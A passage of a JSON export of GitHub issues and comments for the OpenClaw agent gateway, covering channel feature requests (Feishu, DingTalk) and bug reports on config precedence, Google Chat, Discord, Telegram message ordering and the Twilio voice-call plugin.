          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13544#issuecomment-3881987999",
          "createdAt": "2026-02-11T03:57:46Z",
          "updatedAt": "2026-02-11T03:57:46Z",
          "author": "kusaljr",
          "body": "getting similar error, is there any fixes for it"
        }
      ]
    },
    {
      "number": 13860,
      "title": "飞书",
      "body": "## 功能请求：飞书 (Feishu/Lark) 渠道支持\n\n### 场景描述\n我需要在飞书上使用 OpenClaw 进行消息收发，目前团队工作沟通主要在飞书进行。\n\n### 期望功能\n- 飞书机器人消息接收与发送\n- 群聊支持\n- 私聊支持\n- Webhook 事件订阅\n\n### 备选方案\n如果官方暂无计划，支持 MCP 集成方式也可以接受。\n\n### 参考\n飞书开放平台: https://open.feishu.cn/\n\n---",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13860",
      "createdAt": "2026-02-11T03:54:11Z",
      "updatedAt": "2026-02-11T03:54:11Z",
      "author": "zep-rgb",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13854,
      "title": "[Bug]: Local agent models.json silently overrides central openclaw.json config — no warning, no visibility",
      "body": "## Summary\n\nLocal per-agent `models.json` files in `~/.openclaw/agents/<id>/agent/` silently override the central `openclaw.json` model configuration. There is no warning in `openclaw status`, no documentation of the precedence, and no way to disable this behavior. This causes confusing config drift where `gateway config.patch` changes appear to succeed but have no effect.\n\n## Steps to Reproduce\n\n1. Run `openclaw configure` — this creates local `models.json` in each agent dir\n2. Later, change the model via `gateway config.patch` (e.g., set primary to `anthropic/claude-opus-4-6`)\n3. Run `openclaw status` — agent still shows the old model from the local file\n4. The central config shows the correct value, but the local file wins\n\n## Expected Behavior\n\n- `openclaw status` should **warn** when local agent files override central config\n- `gateway config.patch` should either update local files too, or the precedence should be documented\n- There should be a way to opt out of local overrides (e.g., `agents.list[].localOverrides: false`)\n\n## Actual Behavior\n\n- Silent override with no visibility\n- Multiple `config.patch` calls appear successful but change nothing\n- Only discoverable by manually inspecting `~/.openclaw/agents/<id>/agent/models.json`\n- Configure wizard regenerates these files on restart in some cases\n\n## Impact\n\n- Significant debugging time tracking down why model changes were not taking effect\n- Had to manually `rm` each agent `models.json` to get central config to apply\n- API keys were also embedded in some local `models.json` files (security concern, see #11829)\n\n## Proposed Fix\n\n1. **Short term**: Add a warning line in `openclaw status` when local model overrides exist (e.g., `⚠️ Agent \"my-agent\" has local models.json override`)\n2. **Medium term**: `gateway config.patch` should update or remove conflicting local files\n3. **Long term**: Deprecate local `models.json` in favor of `agents.list[]` in central config, or add explicit `localOverrides: true/false` toggle\n\n## Environment\n\n- OpenClaw 2026.2.9\n- macOS (arm64)\n- Multi-agent setup (4 agents)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13854",
      "createdAt": "2026-02-11T03:36:03Z",
      "updatedAt": "2026-02-11T03:48:58Z",
      "author": "itsGustav",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881967987,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13854#issuecomment-3881967987",
          "createdAt": "2026-02-11T03:47:44Z",
          "updatedAt": "2026-02-11T03:47:44Z",
          "author": "itsGustav",
          "body": "https://github.com/openclaw/openclaw/pull/13857"
        }
      ]
    },
    {
      "number": 7305,
      "title": "[Feature]: Support local timezone for log timestamps",
      "body": "## Summary\n\nThe output of `clawdbot logs` currently displays timestamps in UTC, regardless of the system's local timezone settings. For users in non-UTC regions (e.g., JST), this creates unnecessary friction when correlating log events with local system events or manual observations.\n\n## Proposed solution\n\nI propose adding support for local/custom timezones in log timestamps. Specifically, I suggest the following implementation priority:\n\n1. Auto-detection: Automatically use the system's local timezone by default.\n2. Configuration: Add a config option (e.g., `logging.timezone: \"local\"` or `\"Asia/Tokyo\"`).\n3. CLI Flag: Provide a `--local-time` flag for `clawdbot logs` to override settings on the fly.\n\n## Alternatives considered\n\n- Manual conversion: Converting UTC to local time mentally is error-prone and tedious.\n- External tools: Piping logs to `awk` or date-conversion scripts adds unnecessary complexity to a standard workflow.\n\n## Additional context\n\n- Logger: Clawdbot utilizes tslog.\n- Current Behavior: Timestamps are hardcoded or defaulted to UTC (e.g., `2026-02-03 01:45:23.456Z`).\n- Tested Environment:\n  - System TZ: JST (UTC+9)\n  - Version: 2026.1.24-3\n  - Observed logs remained in UTC despite the system setting.\n\n### Analysis of the current code\n\nIn `src/logging/logger.ts`, the custom transport uses `toISOString()` which explicitly converts the date to UTC:\n\n```typescript\nconst time = logObj.date?.toISOString?.() ?? new Date().toISOString();\n```\n\nTo support local time, this should be replaced with a formatter that respects the system's timezone offset.\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7305",
      "createdAt": "2026-02-02T17:23:32Z",
      "updatedAt": "2026-02-11T03:47:39Z",
      "author": "ABfry",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3864818489,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7305#issuecomment-3864818489",
          "createdAt": "2026-02-07T16:52:08Z",
          "updatedAt": "2026-02-07T16:52:08Z",
          "author": "garenfeather",
          "body": "+1 on this. Just wanted to add some additional context from looking at the source:\n\n**The config infrastructure already exists** — `agents.defaults.userTimezone` is already used in multiple places (cron jobs, message envelopes, system prompts, heartbeat scheduling), but `formatLogTimestamp()` in `src/cli/logs-cli.ts` (line 62-74) ignores it entirely and hardcodes `toISOString()`:\n\n```typescript\nfunction formatLogTimestamp(value?: string, mode: \"pretty\" | \"plain\" = \"plain\") {\n  // ...\n  if (mode === \"pretty\") return parsed.toISOString().slice(11, 19); // always UTC\n  return parsed.toISOString(); // always UTC\n}\n```\n\nA minimal fix could be as simple as reading the config's `userTimezone` (or falling back to `Intl.DateTimeFormat().resolvedOptions().timeZone`) and using `Intl.DateTimeFormat` with `formatToParts()` to produce the same `HH:MM:SS` / `YYYY-MM-DDTHH:MM:SS` format but in the user's local timezone. This would also naturally support the CLI flag approach (`--local-time`) proposed above.\n\nSame issue applies to the write side in `src/logging/logger.ts` where `logObj.date?.toISOString()` bakes UTC into the log file itself — though fixing only the display side (`logs-cli.ts`) is probably sufficient since raw log storage in UTC is a reasonable default."
        },
        {
          "id": 3881967830,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7305#issuecomment-3881967830",
          "createdAt": "2026-02-11T03:47:39Z",
          "updatedAt": "2026-02-11T03:47:39Z",
          "author": "victorchoy",
          "body": "surely need this"
        }
      ]
    },
    {
      "number": 13858,
      "title": "[Feature]: Add DingTalk (钉钉) Channel Support",
      "body": "# Feature Request: Add DingTalk (钉钉) Channel Support\n\n## Background\n\nDingTalk is one of China's leading enterprise communication platforms with hundreds of millions of users. Adding DingTalk support would greatly expand OpenClaw's reach to Chinese enterprise users who rely on DingTalk for daily communication and collaboration.\n\n## We Have a Production-Ready Implementation\n\nI'm happy to share that we already have a mature, production-tested implementation available:\n\nRepository: https://github.com/largezhou/openclaw-dingtalk\n\n## Features\n\nThe implementation includes:\n\n- WebSocket Stream mode connection with DingTalk Open Platform API (no public IP or domain required)\n- Support for receiving text, image, audio, video, file, and rich text messages\n- Support for replying with text (Markdown), image, and file messages\n- Private chat (direct message) support\n- Proactive messaging capability via BatchSendOTO API\n- Interactive onboarding flow for bot configuration\n- Media upload/download pipeline with graceful degradation\n- Async non-blocking message processing\n- Allowlist-based security for sender validation\n- OpenClaw command support (`/new`, `/compact`, `/models`, etc.)\n\n## Next Steps\n\nI would like to contribute this implementation to the official OpenClaw repository. Before submitting a PR, I wanted to start this discussion to:\n\n- Confirm community interest in this feature\n- Get feedback on the implementation approach\n- Discuss any concerns or requirements from maintainers\n\nLooking forward to your thoughts!\n\n## PR Submitted\n\nI have submitted a PR for this feature: [#13291](https://github.com/openclaw/openclaw/pull/13291)\n\nFollowing the contribution guidelines, I'm opening this discussion to:\n\n- Get maintainer buy-in on the approach and implementation\n- Discuss any concerns or requirements before merging\n- Consider breaking into smaller PRs if the current scope is too large for review\n\nI'm fully committed to working with the maintainers to ensure this contribution meets the project's standards. Happy to make any adjustments based on your feedback!\n\nLooking forward to your thoughts!\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13858",
      "createdAt": "2026-02-11T03:46:41Z",
      "updatedAt": "2026-02-11T03:46:53Z",
      "author": "largezhou",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "onboarding",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13856,
      "title": "[Bug]:  Google Chat: Space webhook events not received by OpenClaw (DMs work correctly)",
      "body": "## Summary\n\nGoogle Chat space webhook events are not being received by OpenClaw, causing complete failure to respond to messages posted in spaces. DM events work correctly, but any message sent from a space (e.g., `spaces/AAQAUhIx_4U`) never reaches OpenClaw's message processing pipeline. Additionally, incoming space messages appear to have their source space ID incorrectly mapped to DM space IDs in message metadata.\n\n## Steps to reproduce\n\n1. Configure Google Chat bot with webhook integration pointing to OpenClaw\n2. Set `groupPolicy: \"open\"` and `requireMention: false` in googlechat channel config\n3. Add the bot to a Google Chat space\n4. Send a message to the bot via DM - ✅ **works fine**\n5. Send a message to the bot in the space - ❌ **no response**\n6. Check OpenClaw logs - no webhook events logged for space messages\n\n## Expected behavior\n\n- Space messages should trigger webhook events that reach OpenClaw's message processing\n- OpenClaw should respond in the space where the message was sent\n- Incoming message metadata should correctly identify the source space ID\n\n## Actual behavior\n\n- **Space webhook events never reach OpenClaw** - zero log entries for incoming space messages\n- **DM webhook events work perfectly** - full message processing pipeline executes\n- **Space messages appear mislabeled** - when they do arrive, they show source as DM space (`spaces/gd-7USAAAAE`) instead of actual space (`spaces/AAQAUhIx_4U`)\n- **Outgoing messages TO spaces work fine** - can successfully send via `message` tool with correct space ID\n\n## Environment\n\nOpenClaw version: 2026.2.9\nOS: macOS (Darwin 23.6.0)\nInstall method: npm\nNode.js: v25.4.0\nChannel: Google Chat (webhook + service account)\n\n**Google Chat Config:**json\n\"googlechat\": {\n  \"enabled\": true,\n  \"groupPolicy\": \"open\",\n  \"groups\": {\n    \"*\": {\n      \"requireMention\": false  // Temporarily disabled for testing\n    }\n  },\n  \"serviceAccountFile\": \"/path/to/service-account.json\",\n  \"audienceType\": \"app-url\", \n  \"audience\": \"https://hostname/googlechat\",\n  \"webhookPath\": \"/googlechat\"\n}\n## Logs or screenshots\n\n**Successful DM processing** (shows full pipeline):embedded run start: messageChannel=googlechat\nTracking pending messaging text: tool=message len=62\n**Missing space processing** (zero log entries when space message sent):# <-- Complete silence in logs when space message posted -->\n**Webhook startup** (appears successful):[gateway/channels/googlechat] [default] starting Google Chat webhook\n**No authentication/webhook errors found** in logs.\n\n**Evidence of outgoing success:**# Can send TO spaces successfully\nmessage tool -> target: \"spaces/AAQAUhIx_4U\" -> result: {\"ok\": true, \"to\": \"spaces/AAQAUhIx_4U\"}\n## Additional context\n\nThis issue is **different from #12323** (the @mention detection bug). That issue was about mentions being silently dropped due to missing `botUser` config. This issue is about **space webhook events never reaching OpenClaw at all**.\n\n**Key debugging evidence:**\n- DMs work perfectly (rules out auth/webhook setup issues)\n- Outgoing space messages work (rules out API/space ID issues)  \n- Zero incoming webhook events logged for spaces (suggests webhook routing problem)\n- Space messages get source ID mangled when they do arrive\n\n**Possible root causes:**\n- Google Chat webhook configuration has separate endpoints for DMs vs spaces\n- OpenClaw webhook handler rejecting/filtering space events before processing\n- Space permission/scope issues in Google Chat app configuration\n- Space webhook events being sent to different endpoint than configured\n\n**Impact:** Complete inability to use OpenClaw in Google Chat spaces, limiting functionality to DMs only.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13856",
      "createdAt": "2026-02-11T03:42:47Z",
      "updatedAt": "2026-02-11T03:42:47Z",
      "author": "kevllarco",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "googlechat"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 11473,
      "title": "Feature: Static message cron payload (no AI tokens)",
      "body": "## Problem\n\nCurrently, all cron payloads require an AI call to process:\n- `systemEvent` → injects into session → Claude processes → output\n- `agentTurn` → spawns isolated session → Claude processes → output\n\nThis means even simple, predictable messages (e.g., \"Good morning!\", \"Don't forget to drink water!\") cost tokens.\n\n## Proposal\n\nAdd a new payload type: `staticMessage`\n\n```json\n{\n  \"schedule\": { \"kind\": \"cron\", \"expr\": \"0 8 * * *\" },\n  \"payload\": {\n    \"kind\": \"staticMessage\",\n    \"channel\": \"telegram\",\n    \"target\": \"-5298599081\",\n    \"text\": \"Goedemorgen! ☀️\"\n  }\n}\n```\n\nThis would:\n1. Send the message directly to the channel\n2. Skip AI processing entirely\n3. Cost $0 in tokens\n\n## Use Cases\n\n- Daily greetings\n- Fixed reminders (\"Take your meds!\")\n- Scheduled announcements\n- Any message that doesn't need dynamic content\n\n## Alternative\n\nCurrently the workaround is to use `agentTurn` with a shell script that curls the Telegram API directly, but that's clunky and still requires an AI call to trigger it.\n\n---\n*Requested by Roel via Daniella*",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11473",
      "createdAt": "2026-02-07T21:26:07Z",
      "updatedAt": "2026-02-11T03:41:09Z",
      "author": "daniella-11ways",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881948994,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11473#issuecomment-3881948994",
          "createdAt": "2026-02-11T03:40:45Z",
          "updatedAt": "2026-02-11T03:41:09Z",
          "author": "Oyshoboy",
          "body": "great, same problem here"
        }
      ]
    },
    {
      "number": 13851,
      "title": "[Bug]: Browser act action (click/type) broken - returns \"tab not found\" error",
      "body": "Title: Browser act action (click/type) broken - returns \"tab not found\" error\n\nDescription:\n\nOpenClaw version: 2026.2.9\nOS: macOS arm64 (Apple Silicon)\nBrowser: Google Chrome 144.0.7559.133\n\nProblem:\nThe browser act action (click, type) does not work. It returns error: \"Error: tab not found\" even when the browser tab is visible and accessible.\n\nWhat works:\n\n• ✅ browser action=\"navigate\" - Works perfectly\n• ✅ browser action=\"snapshot\" - Works perfectly\n• ✅ browser action=\"screenshot\" - Works perfectly\n• ❌ browser action=\"act\" (click/type) - BROKEN\nSteps to reproduce:\n\n1. Start Chrome with remote debugging: chrome --remote-debugging-port=9222\n2. Use browser action=\"start\" with profile=\"openclaw\"\n3. Navigate to any page with browser action=\"navigate\"\n4. Attempt to click with browser action=\"act\", request={\"kind\":\"click\", \"targetId\":\"...\"}\n5. Result: \"Error: tab not found\"\nExpected behavior:\nThe act action should click elements and type in fields when the browser is connected via CDP.\n\nAdditional notes:\n\n• The Chrome DevTools Protocol connection is working (navigate/snapshot work)\n• This prevents any meaningful browser automation\n• The issue persists across browser restarts and OpenClaw profile restarts\n\nPaste relevant logs or add screenshots (redact secrets).\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13851",
      "createdAt": "2026-02-11T03:29:24Z",
      "updatedAt": "2026-02-11T03:29:24Z",
      "author": "stelleriaogando-ship-it",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": []
      }
    },
    {
      "number": 11231,
      "title": "Discord bot connects but doesn't receive guild messages",
      "body": "## Description\nDiscord bot connects successfully and logs in, but never receives MESSAGE_CREATE events from guild channels. Messages sent in the guild are visible in Discord but never appear in OpenClaw logs.\n\n## Environment\n- OpenClaw version: 2026.2.6-3\n- OS: macOS 15.3.1 (arm64)\n- Node: v25.5.0\n\n## Configuration\n```json\n{\n  \"channels\": {\n    \"discord\": {\n      \"enabled\": true,\n      \"groupPolicy\": \"open\",\n      \"guilds\": {}\n    }\n  }\n}\n```\n\n## Steps to Reproduce\n1. Configure Discord bot with valid token\n2. Ensure all Privileged Gateway Intents are enabled (Presence, Server Members, Message Content)\n3. Bot role has View Channels, Send Messages, Read Message History permissions\n4. Send a message in a guild text channel\n\n## Expected Behavior\nMessage should appear in gateway logs and trigger agent response\n\n## Actual Behavior\n- Bot logs in successfully: `[discord] logged in to discord as <bot_id>`\n- No message events are logged\n- `openclaw channels status --probe` shows Discord as OK\n- Outbound messages work (bot can send to channels)\n- Only inbound guild messages are broken\n\n## Troubleshooting Attempted\n- Reset bot token\n- Verified all intents enabled in Developer Portal\n- Verified bot role permissions in server\n- Removed explicit guild/channel config entries\n- Tried with and without requireMention\n- Multiple gateway restarts\n\n## Logs\n```\n[discord] [default] Discord Message Content Intent is limited; bots under 100 servers can use it without verification.\n[discord] [default] starting provider (@Flo)\n[discord] logged in to discord as 1467683870987128963\n```\n\nNo MESSAGE_CREATE or any inbound message logs appear when sending messages in guild.\n\n## Additional Context\n- DM functionality not tested\n- Bot was working briefly on initial setup (Feb 1-2) then stopped receiving messages\n- Issue persists across gateway restarts and token resets",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11231",
      "createdAt": "2026-02-07T15:49:11Z",
      "updatedAt": "2026-02-11T03:19:13Z",
      "author": "florence-assistant",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3875104684,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11231#issuecomment-3875104684",
          "createdAt": "2026-02-10T03:24:03Z",
          "updatedAt": "2026-02-10T03:24:03Z",
          "author": "zhaohm14",
          "body": "Same issue. My bot connects successfully and can read history and send outbound messages to the channel. However, it fails to receive any real-time `MESSAGE_CREATE` events (push notifications), which makes it impossible to trigger the agent via Discord messages.\n\n**Environment:**\n- OpenClaw version: `2026.2.6-3`\n- OS: `WSL2 (Ubuntu 24.04)`\n- Node: `v24.13.0`"
        },
        {
          "id": 3877323932,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11231#issuecomment-3877323932",
          "createdAt": "2026-02-10T12:34:18Z",
          "updatedAt": "2026-02-10T12:34:18Z",
          "author": "absol89",
          "body": "I solved it by specifying the channel under the guild. Previously I had a simpler setup that stopped working after 2.6 updated\n\n\"discord\": {\n  \"groupPolicy\": \"allowlist\",\n  \"guilds\": {\n    \"YOUR_GUILD_ID\": {\n      \"requireMention\": true,\n      \"users\": [\"AUTHORIZED_USER_ID\"],\n      \"channels\": {\n        \"CHANNEL_ID_1\": {\n          \"allow\": true,\n          \"requireMention\": false\n        },\n        \"CHANNEL_ID_2\": {\n          \"allow\": true,\n          \"requireMention\": true\n        }\n      }\n    }\n  }\n}\n\nIt also works with \"groupPolicy\": \"open\", and in this example, the bot would respond only to @tags in the guild, but regular message intent interpreted posts in channel 1, but only @tags in channel 2. The guild level requireMention may not have any effect.\n\n\"YOUR_GUILD_ID\": {\n      \"requireMention\": true"
        },
        {
          "id": 3881897526,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11231#issuecomment-3881897526",
          "createdAt": "2026-02-11T03:19:13Z",
          "updatedAt": "2026-02-11T03:19:13Z",
          "author": "zhaohm14",
          "body": "I was able to resolve the issue in my earlier comment.\n\nThe root cause was that HTTP traffic (e.g., fetching message history and outbound messages) was correctly routed through my proxy via the environment variables, while WebSocket (wss://) connections were not. Since `MESSAGE_CREATE` events are delivered over the WebSocket gateway, they were never reaching the bot, resulting in no real-time incoming messages being logged or processed.\n\nI fixed it by forcing the gateway process to use the proxy for all connections. Specifically, I modified the `openclaw-gateway.service` systemd unit and prefixed the `ExecStart` command with `proxychains4`:\n\n```\nExecStart=/usr/bin/proxychains4 -q /usr/local/bin/node ...\n```\nAfter restarting the service (`systemctl --user daemon-reload && openclaw gateway restart`), the WebSocket connection now goes through the proxy, and DMs can be received normally.\n\nHope this helps anyone running into the same proxy-related gateway issue.\n"
        }
      ]
    },
    {
      "number": 11044,
      "title": "Outbound Telegram messages arrive out of order when multiple tool results fire concurrently",
      "body": "## Bug Description\n\nWhen the agent triggers multiple tool calls in a single turn, the resulting Telegram messages frequently appear **out of order** — the first message appears last and vice versa. This is a consistent, user-visible issue.\n\n## Root Cause\n\nTool result messages in `src/auto-reply/reply/agent-runner-execution.ts` are dispatched in a **fire-and-forget pattern**. Each tool result creates an independent async task that is added to `pendingToolTasks` without awaiting previous results:\n\n```javascript\nonToolResult: onToolResult ? (payload) => {\n    const task = (async () => {\n        const { text, skip } = normalizeStreamingText(payload);\n        if (skip) return;\n        await params.typingSignals.signalTextDelta(text);\n        await onToolResult({ text, mediaUrls: payload.mediaUrls });\n    })().catch((err) => {\n        logVerbose(`tool result delivery failed: ${String(err)}`);\n    }).finally(() => {\n        params.pendingToolTasks.delete(task);\n    });\n    params.pendingToolTasks.add(task);  // No await — runs concurrently\n} : void 0\n```\n\n`pendingToolTasks` is only awaited collectively via `Promise.allSettled` at the end of the turn — **after** messages have already been sent to Telegram. Network latency jitter causes later-dispatched messages to arrive before earlier ones.\n\n### Contributing factors\n\n1. **No global send serialization** across concurrent reply types — block replies use `sendChain`, but tool results bypass it entirely.\n2. **apiThrottler** (`@grammyjs/transformer-throttler`) can batch-release queued requests during rate limit recovery, amplifying reordering.\n3. The `sequentialize` middleware only handles **inbound** ordering, not outbound.\n\n## Reproduction\n\n1. Send a message that triggers 2+ independent tool calls (e.g., two parallel `read` or `web_search` calls)\n2. Observe the tool result messages arriving in reversed or shuffled order in Telegram\n\n## Suggested Fix\n\nSerialize tool result delivery using a promise chain instead of fire-and-forget:\n\n```javascript\nlet toolResultChain = Promise.resolve();\n\nonToolResult: onToolResult ? (payload) => {\n    toolResultChain = toolResultChain.then(async () => {\n        const { text, skip } = normalizeStreamingText(payload);\n        if (skip) return;\n        await params.typingSignals.signalTextDelta(text);\n        await onToolResult({ text, mediaUrls: payload.mediaUrls });\n    }).catch((err) => {\n        logVerbose(`tool result delivery failed: ${String(err)}`);\n    });\n} : void 0\n```\n\nFor a more robust fix, a per-chat global send queue would prevent interleaving across all reply types (block replies, tool results, final replies).\n\n## Environment\n\n- OpenClaw latest (npm)\n- Channel: Telegram\n- macOS (Apple Silicon)\n\n## Severity\n\n**High** — frequently visible to end users, degrades conversation readability.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11044",
      "createdAt": "2026-02-07T09:52:04Z",
      "updatedAt": "2026-02-11T03:17:36Z",
      "author": "hariseldonsradiant",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3874272205,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11044#issuecomment-3874272205",
          "createdAt": "2026-02-09T22:47:26Z",
          "updatedAt": "2026-02-09T22:47:26Z",
          "author": "talos-b",
          "body": "+1 — seeing this regularly. The fire-and-forget pattern for tool results causes visible reordering in Telegram. Would love to see all sends routed through a single serialized chain."
        },
        {
          "id": 3881893957,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11044#issuecomment-3881893957",
          "createdAt": "2026-02-11T03:17:36Z",
          "updatedAt": "2026-02-11T03:17:36Z",
          "author": "DmytroVolodymyrson",
          "body": "Seeing this as well. Messages regularly come out of order, and I usually receive the final message first, with the intermediate step messages arriving afterward. I tried fixing this through the bot’s instructions and configurations, but it didn’t work. Would love to see this resolved."
        }
      ]
    },
    {
      "number": 13847,
      "title": "Voice Call Plugin: Media stream connects but onConnect callback never fires (no TTS playback)",
      "body": "## Environment\n- OpenClaw: 2026.2.9 (npm install)\n- OS: macOS 26.2 (arm64, Mac mini M4)\n- Plugin: @openclaw/voice-call (bundled)\n- Provider: Twilio\n- TTS: ElevenLabs (eleven_multilingual_v2, George voice)\n- STT: OpenAI\n- Tunnel: ngrok free tier → port 3334\n\n## Config (redacted)\n```json\n{\n  \"provider\": \"twilio\",\n  \"fromNumber\": \"+19164097791\",\n  \"publicUrl\": \"https://kate-sobersided-mui.ngrok-free.dev/voice/webhook\",\n  \"skipSignatureVerification\": true,\n  \"serve\": { \"port\": 3334, \"path\": \"/voice/webhook\" },\n  \"outbound\": { \"defaultMode\": \"conversation\" },\n  \"inboundPolicy\": \"allowlist\",\n  \"allowFrom\": [\"+15559991234\"],\n  \"inboundGreeting\": \"Hello, this is LearnedClaw. How can I help you?\",\n  \"streaming\": { \"enabled\": true, \"streamPath\": \"/voice/stream\" },\n  \"tts\": {\n    \"provider\": \"elevenlabs\",\n    \"elevenlabs\": { \"voiceId\": \"JBFqnCBsd6RMkjVDRZzb\", \"modelId\": \"eleven_multilingual_v2\" }\n  }\n}\n```\n\n## What works\n- Twilio calls connect (both inbound and outbound)\n- Webhook returns correct TwiML with `<Connect><Stream>`\n- WebSocket media stream connects on port 3334\n- Logs show: `[MediaStream] Twilio connected` and `[MediaStream] Stream started: MZ... (call: CA...)`\n- `[voice-call] Media streaming initialized` and `Media stream WebSocket on ws://127.0.0.1:3334/voice/stream` both appear at startup\n- ElevenLabs TTS provider configured\n- OpenAI API key present (required for media stream handler initialization)\n\n## What fails\n- The `onConnect` callback in `webhook.ts` **never fires** — we never see `[voice-call] Media stream connected: ...` in logs\n- Therefore `speakInitialMessage()` is never called\n- Therefore no TTS audio is ever generated or sent\n- Caller hears silence, then Twilio eventually hangs up\n\n## Suspected cause\nIn `webhook.ts`, the `shouldAcceptStream` callback calls:\n1. `this.manager.getCallByProviderCallId(callId)` — if this returns null, the stream is silently rejected\n2. `twilio.isValidStreamToken(callId, token)` — if this fails, the stream is rejected with a warning log (but we don't see this warning either)\n\nSince neither the rejection warning nor the `onConnect` log appear, it seems like `getCallByProviderCallId()` returns null, causing a silent `return false` before the token check. The Twilio CallSid (CA...) may not be matching the internally stored providerCallId.\n\nAlternatively, the `shouldAcceptStream` return value may not be correctly gating the `onConnect` callback in `media-stream.ts`.\n\n## Steps to reproduce\n1. Configure voice-call plugin with Twilio + ElevenLabs + ngrok\n2. Make an outbound call via `voice_call` tool or receive an inbound call\n3. Observe that `[MediaStream] Stream started` appears but `[voice-call] Media stream connected` does not\n4. Caller hears silence\n\n## Gateway log excerpt\n```\n[voice-call] Media streaming initialized\n[voice-call] Webhook server listening on http://127.0.0.1:3334/voice/webhook\n[voice-call] Media stream WebSocket on ws://127.0.0.1:3334/voice/stream\n[gateway] [voice-call] Telephony TTS provider configured\n[gateway] [voice-call] Media stream handler wired to provider\n[gateway] [voice-call] Runtime initialized\n[voice-call] Starting max duration timer (300s) for call 24d77b94-...\n[voice-call] WebSocket upgrade for media stream\n[MediaStream] Twilio connected\n[MediaStream] Stream started: MZb8582d29... (call: CA6128eb1c...)\n# --- Nothing after this. No 'Media stream connected', no 'speakInitialMessage', no TTS. ---\n```\n\n## Additional notes\n- Without streaming (`streaming.enabled: false`), the webhook returns `<Pause length=\"30\"/>` — no `<Say>` fallback for the greeting\n- The stale call journal (`voice-calls/calls.jsonl`) caused persistent \"Maximum concurrent calls (1) reached\" errors until manually cleared\n- ngrok free tier was used; skipSignatureVerification was set to true\n- Paid Twilio account (not trial)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13847",
      "createdAt": "2026-02-11T03:17:17Z",
      "updatedAt": "2026-02-11T03:17:17Z",
      "author": "LearnedClaw",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 7952,
      "title": "Feature Request: Allow specifying agentId in /hooks/agent webhook",
      "body": "## Summary\n\nThe `/hooks/agent` webhook currently always uses the default agent from config (`agents.list[0]` or the one marked `default: true`). There's no way to specify a target agent in the request payload.\n\n## Current Behavior\n\nWhen calling:\n```bash\ncurl -X POST http://127.0.0.1:18789/hooks/agent \\\n  -H 'Authorization: Bearer <token>' \\\n  -d '{\"message\": \"hello\", \"sessionKey\": \"agent:xiaomiao:main\"}'\n```\n\nThe `sessionKey` is treated as `mainKey` and the default agentId is prepended:\n- Expected: `agent:xiaomiao:main`\n- Actual: `agent:hakimi:agent:xiaomiao:main`\n\nThis happens in `cron/isolated-agent/run.js` lines 66-70 where `buildAgentMainSessionKey` always uses the config's default agentId.\n\n## Proposed Solution\n\nAdd an optional `agentId` field to the webhook payload:\n\n```json\n{\n  \"message\": \"hello\",\n  \"agentId\": \"xiaomiao\",\n  \"sessionKey\": \"hook:123\"\n}\n```\n\nWhen `agentId` is provided, use it instead of the default agent.\n\n## Use Case\n\nI have multiple agents (hakimi, xiaomiao) on the same gateway. External services (like a coding assistant on another machine) need to send notifications to specific agents without blocking. Currently the only workaround is to configure separate webhook endpoints for each agent.\n\nThanks for considering! 🫡",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7952",
      "createdAt": "2026-02-03T11:15:01Z",
      "updatedAt": "2026-02-11T03:16:22Z",
      "author": "hakimi-agent",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881890446,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7952#issuecomment-3881890446",
